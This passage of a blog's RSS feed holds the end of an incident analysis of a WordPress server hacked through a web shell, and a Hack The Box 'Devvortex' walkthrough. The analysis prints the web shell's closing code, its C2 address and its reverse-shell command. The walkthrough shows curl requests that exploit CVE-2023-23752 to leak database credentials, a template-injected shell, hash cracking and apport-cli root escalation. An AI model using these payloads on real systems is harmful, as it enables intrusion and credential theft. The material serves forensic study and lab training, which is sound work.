</span></span><span style="display:flex;"><span>fclose($pipes[0]);
</span></span><span style="display:flex;"><span>fclose($pipes[1]);
</span></span><span style="display:flex;"><span>fclose($pipes[2]);
</span></span><span style="display:flex;"><span>proc_close($process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>function printit ($string) {
</span></span><span style="display:flex;"><span>	if (!$daemon) {
</span></span><span style="display:flex;"><span>		print &#34;$string\n&#34;;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>?&gt;
</span></span></code></pre></div><p>From this code we can see the C2 server <code>43.204.24.76:6969</code> and the command <code>uname -a; w; id; /bin/bash -i</code> the web shell executed on behalf of the TA. First, the web shell created a process with PID <code>234471</code> to execute the shell&rsquo;s payload. Then for <code>/bin/bash -i</code> command it created an interactive bash shell with the PID <code>234517</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>www-data  234517  234471   2616   596 ?        S    09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i
</span></span><span style="display:flex;"><span>www-data  234521  234517   4248  3444 ?        S    09:01 00:00:00 /bin/bash -i
</span></span></code></pre></div><p>To elevate the shell&rsquo;s privilege the attacker used a bash script <code>LinEnum.sh</code> to enumerate potential privilege escalation vectors. The TA uploaded <code>LinEnum.sh</code> to <code>/tmp</code> and then <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>7,1,/dev/shm/LinEnum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631
</span></span></code></pre></div><p>And they were successful in gaining root access. From the <code>auth.log</code> we see that the TA logged into SSH using <code>ubuntu</code> user&rsquo;s private SSH key using another IP <code>203.101.190.9</code>. Then escalate their privilege to <code>root</code> using su.</p>
<p>Immediately after that, the threat actor created an account <code>cyberjunkie_admin</code> for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: Accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: RSA SHA256:c/25gw2HCe4yy/6f4eAd5O1dvdGebtUFKOEVAh7kmzk
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 systemd-logind[523]: New session 1971 of user ubuntu.
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/su
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Received SIGHUP; restarting.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on 0.0.0.0 port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on :: port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, UID=1001, GID=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user &#39;cyberjunkie_admin&#39; information
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0)
</span></span></code></pre></div><p>Closely examining the sudoers permission file we found a <code>very risky configuration</code> that allowed the <code>ubuntu</code> user to perform tasks as <code>root</code> without authentication.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on Wed, 12 Jul 2023 11:41:45 +0000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># User rules for ubuntu
</span></span><span style="display:flex;"><span>ubuntu ALL=(ALL) NOPASSWD:ALL
</span></span></code></pre></div><h2 id="timeline">Timeline</h2>
<ul>
<li>
<p><strong>Reconnaissance:</strong> On <code>2023-08-08 08:21:27</code> the TA started the scanner using IP <code>23.106.60.163</code>.</p>
</li>
<li>
<p><strong>Weaponization &amp; Delivery:</strong> On <code>2023-08-08 08:32:50</code> The TA identified the vulnerable WordPress plugin <code>Ultimate Member v2.6.4</code>.</p>
</li>
<li>
<p><strong>Exploitation:</strong> On <code>2023-08-08 08:33:58</code> the TA successfully exploited CVE-2023-3460 and added an Admin user <code>secragon</code>.</p>
</li>
<li>
<p><strong>Installation:</strong> On <code>2023-08-08 08:58:02</code> the TA created a reverse web shell <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The TA did this from an IP <code>198.16.74.45</code>. After that, on <code>2023-08-08 09:06:53</code> the TA uploaded a Bash Script <code>LinEnum.sh</code> inside the <code>/tmp</code> folder then he moved it to the <code>/dev/shm</code> on <code>2023-08-08 09:32:38</code>.</p>
</li>
<li>
<p><strong>Command and Control:</strong> The TA used IP <code>43.204.24.76</code> and port <code>6969</code> as a C2 server.</p>
</li>
</ul>
<h2 id="remarks">Remarks</h2>
<p>Analyzing the log file indicates that the server was already compromised on <code>2023-08-07 13:50:25</code> by another threat actor who logged into the SSH account of <code>ubuntu</code> user from IP <code>203.101.190.9</code> using SSH key and created a backdoor admin account <code>cyberjunkie_admin</code> on <code>2023-08-07 13:55:36</code>. The account seems to be dormant but that TA (<code>203.101.190.9</code>) also compromised the MySQL Database.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>HTB Machine Devvortex</title>
      <link>http://localhost:1313/posts/htb-machines/devvortex/</link>
      <pubDate>Thu, 16 May 2024 16:41:36 +0200</pubDate>
      
      <guid>http://localhost:1313/posts/htb-machines/devvortex/</guid>
      <description><![CDATA[<h1 id="devvortex---htbhttpswwwhacktheboxcommachinesdevvortex">Devvortex - <a href="https://www.hackthebox.com/machines/devvortex">HTB</a></h1>
<p><img src="images/banner.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap-services">Nmap Services</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
</tr>
</thead>
<tbody>
<tr>
<td>80</td>
<td>http (nginx/1.18.0)</td>
</tr>
<tr>
<td>22</td>
<td>ssh ()</td>
</tr>
</tbody>
</table>
<h3 id="subdomains-vhost">Subdomains (VHost)</h3>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fs 154 

    /'___\  /'___\           /'___\       
   /\ \__/ /\ \__/  __  __  /\ \__/       
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
     \ \_\   \ \_\  \ \____/  \ \_\       
      \/_/    \/_/   \/___/    \/_/       

   v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://devvortex.htb
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Header           : Host: FUZZ.devvortex.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 135ms]
:: Progress: [26584/26584] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:56] :: Errors: 1 ::
</code></pre>
<ul>
<li><strong>dev.devvortex.htb</strong></li>
</ul>
<h3 id="http-enumeration---devdevvortexhtb">HTTP Enumeration - dev.devvortex.htb</h3>
<ul>
<li>
<p><strong>ffuf</strong></p>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -u http://dev.devvortex.htb/FUZZ                       

  /'___\  /'___\           /'___\       
 /\ \__/ /\ \__/  __  __  /\ \__/       
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
   \ \_\   \ \_\  \ \____/  \ \_\       
    \/_/    \/_/   \/___/    \/_/       

 v2.1.0-dev
________________________________________________
:: Method           : GET
:: URL              : http://dev.devvortex.htb/FUZZ
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 423ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 106ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1176ms]
cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
:: Progress: [26584/26584] :: Job [1/1] :: 33 req/sec :: Duration: [0:12:53] :: Errors: 2 ::
</code></pre>
</li>
<li>
<p><strong>robots.txt</strong> - <a href="http://dev.devvortex.htb/robots.txt">http://dev.devvortex.htb/robots.txt</a></p>
<pre><code>&lt;---snipped---&gt;
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
</code></pre>
</li>
<li>
<p><strong>README.txt</strong></p>
<pre><code>Joomla! CMS™

1- Overview
	* This is a Joomla! 4.x installation/upgrade package.
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev

  &lt;---snipped---&gt;
</code></pre>
</li>
<li>
<p><strong>Services Running</strong></p>
<ul>
<li>Joomla CMS 4.2</li>
</ul>
</li>
</ul>
<h3 id="vulnerability-assessment---joomla-cms-42">Vulnerability Assessment - Joomla CMS 4.2</h3>
<ul>
<li>
<p><strong>Vulnerability</strong>: Joomla CMS 4.2 is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check in <code>Core</code> webservice endpoints. The affected versions are 4.0.0-4.2.7 in range. Due to flaws in Joomla’s access control to Web service endpoints, unauthenticated attackers access the RestAPI interface to obtain Joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. For more on the vulnerability :</p>
<ul>
<li><a href="https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/">NS Focus Global</a></li>
<li><a href="https://vulncheck.com/blog/joomla-for-rce">Vuln Check</a></li>
</ul>
</li>
<li>
<p><strong>PoC</strong>: A publicly available exploit is published on <a href="https://www.exploit-db.com/exploits/51334">ExploitDB</a>. We can use this <code>{root_url}/api/index.php/v1/users?public=true</code> REST endpoint to obtain user information , and this <code>{root_url}/api/index.php/v1/config/application?public=true</code> endpoint for application configuration.</p>
</li>
</ul>
<h2 id="joomla-cms-42">Joomla CMS 4.2</h2>
<h3 id="exploiting-cve-2023-23752">Exploiting CVE-2023-23752</h3>
<ul>
<li>
<p><strong>User Information</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/v1/users?public=true

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/v1\/users?public=true&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;649&quot;,&quot;attributes&quot;:{&quot;id&quot;:649,&quot;name&quot;:&quot;lewis&quot;,&quot;username&quot;:&quot;lewis&quot;,&quot;email&quot;:&quot;lewis@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:1,&quot;registerDate&quot;:&quot;2023-09-25 16:44:24&quot;,&quot;lastvisitDate&quot;:&quot;2024-04-26 10:37:12&quot;,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Super Users&quot;}},{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;650&quot;,&quot;attributes&quot;:{&quot;id&quot;:650,&quot;name&quot;:&quot;logan paul&quot;,&quot;username&quot;:&quot;logan&quot;,&quot;email&quot;:&quot;logan@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:0,&quot;registerDate&quot;:&quot;2023-09-26 19:15:42&quot;,&quot;lastvisitDate&quot;:null,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Registered&quot;}}],&quot;meta&quot;:{&quot;total-pages&quot;:1}}      
</code></pre>
</li>
<li>
<p><strong>Application Config</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&quot;,&quot;next&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&quot;,&quot;last&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_message&quot;:&quot;This site is down for maintenance.&lt;br&gt;Please check back again soon.&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;display_offline_message&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_image&quot;:&quot;&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;sitename&quot;:&quot;Development&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;editor&quot;:&quot;tinymce&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;captcha&quot;:&quot;0&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;list_limit&quot;:20,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;access&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang_const&quot;:true,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbtype&quot;:&quot;mysqli&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;host&quot;:&quot;localhost&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;user&quot;:&quot;lewis&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;password&quot;:&quot;P4ntherg0t1n5r3c0n##&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;db&quot;:&quot;joomla&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbprefix&quot;:&quot;sd4fg_&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbencryption&quot;:0,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbsslverifyservercert&quot;:false,&quot;id&quot;:224}}],&quot;meta&quot;:{&quot;total-pages&quot;:4}}
</code></pre>
<p>We can see from the <code>meta</code> that it&rsquo;s only page 1 out of 4. We should gather all the data from this api using the <code>next</code> link and save it to a file.</p>
</li>
</ul>
<h3 id="users-and-credentials">Users and Credentials</h3>
<ul>
<li>
<p><strong>Users</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;id&quot;: 649,
    &quot;name&quot;: &quot;lewis&quot;,
    &quot;username&quot;: &quot;lewis&quot;,
    &quot;email&quot;: &quot;lewis@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 1,
    &quot;registerDate&quot;: &quot;2023-09-25 16:44:24&quot;,
    &quot;lastvisitDate&quot;: &quot;2024-04-26 10:37:12&quot;,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Super Users&quot;
}
</code></pre>
</li>
<li>
<p>logan:</p>
<pre><code>{
    &quot;id&quot;: 650,
    &quot;name&quot;: &quot;logan paul&quot;,
    &quot;username&quot;: &quot;logan&quot;,
    &quot;email&quot;: &quot;logan@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 0,
    &quot;registerDate&quot;: &quot;2023-09-26 19:15:42&quot;,
    &quot;lastvisitDate&quot;: null,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Registered&quot;
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Credentials</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;user&quot;: &quot;lewis&quot;,
        &quot;id&quot;: 224
    }
},
{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;password&quot;: &quot;P4ntherg0t1n5r3c0n##&quot;,
        &quot;id&quot;: 224
    }
},
</code></pre>
<p>We can try this creds to log into the admin dashboard of Joomla at <code>http://dev.devvortex.htb/administrator</code>.</p>
</li>
</ul>
</li>
</ul>
<h3 id="admin-dashboard-enumeration">Admin Dashboard Enumeration</h3>
<ul>
<li>PHP: 7.4.3 which is obsolete and no longer receives official security updates.</li>
<li>MySQL: 8.0.35-0ubuntu0.20.04.1</li>
<li>Server: Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64</li>
<li>Disable PHP Functions:
<ul>
<li>pcntl_alarm</li>
<li>pcntl_fork</li>
<li>pcntl_waitpid</li>
<li>pcntl_wait</li>
<li>pcntl_wifexited</li>
<li>pcntl_wifstopped</li>
<li>pcntl_wifsignaled</li>
<li>pcntl_wifcontinued</li>
<li>pcntl_wexitstatus</li>
<li>pcntl_wtermsig</li>
<li>pcntl_wstopsig</li>
<li>pcntl_signal</li>
<li>pcntl_signal_get_handler</li>
<li>pcntl_signal_dispatch</li>
<li>pcntl_get_last_error</li>
<li>pcntl_strerror</li>
<li>pcntl_sigprocmask</li>
<li>pcntl_sigwaitinfo</li>
<li>pcntl_sigtimedwait</li>
<li>pcntl_exec</li>
<li>pcntl_getpriority</li>
<li>pcntl_setpriority</li>
<li>pcntl_async_signals</li>
<li>pcntl_unshare</li>
</ul>
</li>
<li>Phar: PHP Archive support is enabled. Can be used to bypass upload restriction for a shell.</li>
</ul>
<h3 id="getting-foothold">Getting Foothold</h3>
<p>In the <code>System</code> menu Joomla offeres option to customize a template. I customized a template by modifying a existing php file. By inserting a shellcode I was successful getting a shell on the box as <code>www-data</code> user.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-stabilization">Shell Stabilization</h3>
<p>The shell was not stable at all. I couldn&rsquo;t see any interective output because I was missing an actual shell.</p>
<p><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></p>
<p>I was <code>www-data</code> and it&rsquo;s shell was assigned nologin. I did the following to make the shell stable.</p>
<pre><code>script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
</code></pre>
<p>Then I had a good enough shell to work with.</p>
<h3 id="user-enumeration">User Enumeration</h3>
<p>After inspecting the <code>/etc/passwd</code> file I was sure that I had to escalate my privileges and take over <code>logan</code>  account. I could list the account&rsquo;s home directory and found the user flag but didn&rsquo;t have permission to read it.</p>
<h3 id="service-enumeration">Service Enumeration</h3>
<p>After inspecting for users I tried to access the MySQL database to find any credentials that can help me pivot to <code>logan</code>. So I logged in to the database service using the <code>lewis:P4ntherg0t1n5r3c0n##</code> and it worked.</p>
<h3 id="mysql-enumeration">MySQL Enumeration</h3>
<ul>
<li>
<p><strong>Databses</strong>:</p>
<pre><code>show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
</code></pre>
</li>
<li>
<p><strong>Tables</strong>:</p>
<pre><code>+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
</code></pre>
</li>
<li>
<p>Users:</p>
<pre><code> +----------+--------------------------------------------------------------+
 | username | password                                                     |
 +----------+--------------------------------------------------------------+
 | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
 | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
 +----------+--------------------------------------------------------------+
</code></pre>
</li>
</ul>
<h3 id="cracking-the-logan-hash">Cracking the <code>logan</code> Hash</h3>
<p>Using john the ripper I was able to crack the hash for logan.</p>
<p><code>logan:tequieromucho</code></p>
<p>Let&rsquo;s try this credential to log on. I could successfully log in using <code>ssh</code>.</p>
<h3 id="root-privilege-escalation">Root Privilege Escalation</h3>
<p>After login into the <code>logan</code> account. I ran the command <code>sudo -l</code> with the above password. And I found following sudoers privileges for the account.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Matching Defaults entries for logan on devvortex:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
</span></span><span style="display:flex;"><span>    (ALL : ALL) /usr/bin/apport-cli
</span></span></code></pre></div><p>So <code>logan</code> can run <code>/usr/bin/apport-cli</code> with <code>sudo</code>. After, searching for apport-cli&rsquo;s know vulnerability I found a Privilege Escalation Vulnerability for apport-cli &lt;= v2.26.0 dubbed <code>CVE-2023-1326</code>. The machine&rsquo;s <code>apport-cli</code> version is <code>2.20.11</code>. So it can be exploited if certain conditions are met. <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">For more on the PoC</a>.</p>
<ol>
<li>
<p>System should specially configured to allow unprivileged users to run sudo apport-cli.</p>
</li>
<li>
<p><code>less</code> is configured as the pager.</p>
</li>
<li>
<p>The terminal size can be set.</p>
</li>
</ol>
<p>Unfortunately all of the conditions were present in the box and we successfully gained <code>root</code> privilege following the steps described in PoC. Finally, acquired the root flag.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
